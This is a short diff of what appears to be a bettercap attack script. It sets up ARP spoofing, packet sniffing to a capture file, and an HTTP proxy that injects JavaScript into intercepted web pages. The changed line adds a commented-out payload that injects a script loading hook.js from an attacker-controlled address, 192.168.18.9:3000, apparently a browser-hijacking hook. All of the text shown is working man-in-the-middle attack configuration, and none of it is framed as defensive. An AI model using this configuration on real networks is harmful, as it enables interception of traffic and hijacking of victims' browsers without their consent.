@@ -73,7 +73,7 @@ set arp.spoof.fullduplex true;
 set net.sniff.verbose true;
 set net.sniff.local true;
 set net.sniff.output /tmp/sniffed.pcap;
-set http.proxy.injectjs 'alert(\"You are being watched!\");';
+set http.proxy.injectjs 'alert(\"You are being watched!\");'; # set http.proxy.injectjs "<script src='http://192.168.18.9:3000/hook.js'></script>"
 set http.proxy.script injectjs;
 http.proxy on;
 arp.spoof on;
